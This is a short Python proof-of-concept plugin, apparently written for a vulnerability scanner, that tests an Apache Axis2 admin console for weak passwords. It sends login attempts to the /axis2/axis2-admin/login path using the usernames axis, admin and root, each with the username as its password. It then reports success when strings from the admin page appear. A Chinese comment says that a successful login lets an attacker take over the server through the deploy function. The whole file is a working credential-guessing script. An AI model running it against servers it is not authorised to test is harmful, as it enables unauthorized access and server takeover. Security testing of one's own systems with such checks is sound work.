# Author:w8ay
# Axis2控制台 弱口令
import HackRequests


def poc(arg, **kwargs):
    users = ["axis", "admin", "root"]
    passwods = ["{user}"]
    hack = HackRequests.hackRequests()
    succ = ["Administration Page</title>", "System Components", "axis2-admin/upload",
            'include page="footer.inc">', "axis2-admin/logout"]
    for user in users:
        for passw in passwods:
            passw = passw.replace("{user}", user)
            url = arg + "/axis2/axis2-admin/login"
            data = "userName={0}&password={1}&submit=+Login+".format(
                user, passw)
            hh = hack.http(url, post=data)
            if hh.status_code == 200:
                text = hh.text()
                for s in succ:
                    if s in text:
                        result = {
                            "name": "Axis2控制台 弱口令",  # 插件名称
                            "content": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限",  # 插件返回内容详情，会造成什么后果。
                            "url": url,  # 漏洞存在url
                            "username": user,
                            "password": passw,
                            "log": hh.log,
                            "tag": "info_leak"  # 漏洞标签
                        }
                        return result
    return False


if __name__ == "__main__":
    pass
